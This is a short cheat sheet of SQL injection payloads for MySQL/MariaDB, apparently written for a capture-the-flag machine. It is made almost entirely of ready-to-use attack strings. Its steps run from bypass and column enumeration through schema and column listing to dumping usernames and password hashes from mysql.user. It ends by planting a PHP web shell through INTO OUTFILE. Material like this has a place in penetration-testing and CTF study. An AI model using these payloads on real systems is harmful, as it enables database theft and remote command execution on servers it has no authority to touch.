SQL Helpful Tips
******************

Display current table
#######################

maria-db/MySQL

.. code-block:: console

   1' or 1=1 --'

find number of columns
########################

You keep adding nulls until something pops up.

.. code-block:: console 

        UNION SELECT null; --
        website: http://jarvis/room.php?cod=1 UNION SELECT null,null,null,null,null,null,null; -- 

Display DB name, version, directory, and user
###############################################

.. code-block:: console

        UNION SELECT 1,@@version,@@datadir,user(),database(),6,7;--
        website: http://supersecurehotel.htb/room.php?cod=999 UNION SELECT 1,@@version,@@datadir,user(),database(),6,7;-- 

Display different DBs
######################

.. code-block:: console

        UNION ALL SELECT null,group_concat(schema_name),null,null,null,null,null from information_schema.schemata;--
        website: http://supersecurehotel.htb/room.php?cod=999 UNION ALL SELECT null,group_concat(schema_name),null,null,null,null,null from information_schema.schemata;-- 

Enumerate mysql DB and table users
###################################

.. code-block:: console

        UNION ALL SELECT null,group_concat(column_name),null,null,null,null,null from information_schema.columns WHERE table_schema='mysql' and table_name='user';-- 
        website: http://supersecurehotel.htb/room.php?cod=999 UNION ALL SELECT null,group_concat(column_name),null,null,null,null,null from information_schema.columns WHERE table_schema='mysql' and table_name='user';-- 

enumerate host,user,password
##############################

.. code-block:: console

   UNION ALL SELECT null,group_concat(Host,":",User,":",Password,":",File_priv),null,null,null,null,null from mysql.user;--
   website: http://supersecurehotel.htb/room.php?cod=999 UNION ALL SELECT null,group_concat(Host,":",User,":",Password,":",File_priv),null,null,null,null,null from mysql.user;-- 

create a page to write commands
#################################

.. code-block:: console

        UNION ALL SELECT null,'<?php echo system($_REQUEST ["cmd"]); ?>',null,null,null,null,null INTO OUTFILE '/var/www/html/shell.php';-- - 
        website: http://supersecurehotel.htb/room.php?cod=999 UNION ALL SELECT null,'<?php echo system($_REQUEST ["cmd"]); ?>',null,null,null,null,null INTO OUTFILE '/var/www/html/shell.php';-- 

Lists users
#############

.. code-block:: console

   SELECT user FROM mysql.user; — priv
   10' UNION SELECT user,password,3 from mysql.user;-- -
